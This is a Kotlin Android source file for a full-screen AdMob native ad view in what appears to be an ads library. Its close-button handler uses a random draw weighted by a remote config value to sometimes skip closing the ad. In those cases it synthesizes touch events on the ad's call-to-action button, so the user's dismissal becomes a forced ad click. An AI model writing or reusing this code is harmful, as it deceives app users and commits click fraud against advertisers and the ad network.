package com.dream.libads.admob

import android.content.Context
import android.os.SystemClock
import android.util.AttributeSet
import android.util.Log
//import android.util.AppLog
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.widget.LinearLayout
import androidx.appcompat.widget.AppCompatButton
import androidx.appcompat.widget.AppCompatImageView
import androidx.appcompat.widget.AppCompatRatingBar
import androidx.appcompat.widget.AppCompatTextView
import androidx.constraintlayout.widget.ConstraintLayout
import com.dream.libads.utils.AdsConfigUtils
import com.facebook.shimmer.ShimmerFrameLayout
import com.google.android.gms.ads.nativead.MediaView
import com.google.android.gms.ads.nativead.NativeAdView
import com.libads.databinding.NativeFullScreenIntroBinding
import com.libads.databinding.NativeFullScreenV2Binding
import kotlin.random.Random

class NativeFullScreenAdmobIntro(context: Context, attrs: AttributeSet?) :
    MLBBaseNativeAdView(context, attrs) {
    private var isOpenAds = false

    var mViewBinding: NativeFullScreenIntroBinding =
        NativeFullScreenIntroBinding.inflate(LayoutInflater.from(context), this, true)


    fun initCollapseEvent(onCloseAdsAction: (() -> Unit)) {
//        AppLog.d("TAG", "ssssssss: ")
//        mViewBinding.root.post {
        mViewBinding.btnHideNativeCollapse.visibility = VISIBLE
        mViewBinding.btnHideNativeCollapse.setOnClickListener {
//                AppLog.d("TAG", "initCollapseEvent: ")
//                onCloseAdsAction.invoke()
            if (isOpenAds) {
                Log.d("TAG", "tat ads: 2")
                onCloseAdsAction.invoke()
                isOpenAds = false
                return@setOnClickListener
            }
            val randomInt = Random.nextInt(1,10)
            val hope = AdsConfigUtils(context).getStatusConfig("config_nativefull_ads")
            if (randomInt > hope/10f) {
                Log.d("TAG", "tat ads: 1")
                onCloseAdsAction.invoke()
            } else {
                Log.d("TAG", "nhay ads: ")
                isOpenAds = true

                mViewBinding.rootNativeAd.post {
                    val location = IntArray(2)
                    mViewBinding.btnXX.getLocationOnScreen(location)

                    val x = location[0]
                    val y = location[1]
                    clickAt(x.toFloat(),y.toFloat())
                }
            }
        }
//            mViewBinding.shimmer.btnHideNativeCollapse.setOnClickListener {
//                AppLog.d("TAG", "cxccccc: ")
//
//            }
//        }

    }
    fun clickAt(x: Float, y: Float) {
        val now = SystemClock.uptimeMillis()

        val downEvent = MotionEvent.obtain(
            now,
            now,
            MotionEvent.ACTION_DOWN,
            x,
            y,
            0
        )

        val upEvent = MotionEvent.obtain(
            now,
            now + 50,
            MotionEvent.ACTION_UP,
            x,
            y,
            0
        )

        dispatchTouchEvent(downEvent)
        dispatchTouchEvent(upEvent)

        downEvent.recycle()
        upEvent.recycle()
    }

//    fun getHeaderView():TextView{
//        return mViewBinding.tvCountDown
//    }

    override fun getTitleView(): AppCompatTextView = mViewBinding.adHeadline
    override fun getSubTitleView(): AppCompatTextView = mViewBinding.adBody
    override fun getRatingView(): AppCompatRatingBar? = null
    override fun getIconView(): AppCompatImageView = mViewBinding.adAppIcon
    override fun getPriceView(): AppCompatTextView? =null
    override fun getCallActionButtonView(): AppCompatTextView = mViewBinding.btnXX
    override fun getMediaView(): MediaView = mViewBinding.adMedia
    override fun getAdView(): NativeAdView = mViewBinding.adView
    override fun getViewContainerRate_Price(): View? = null
    override fun getShimmerView(): ShimmerFrameLayout? = mViewBinding.shimmer.shimmerView
    override fun getRootAds(): ConstraintLayout = mViewBinding.rootNativeAd
    override fun getLabelAds(): LinearLayout? = null
    override fun getStore(): AppCompatTextView? = null
    override fun getAdvertiser(): AppCompatTextView? = null
    override fun getTvStar(): AppCompatTextView? =null
}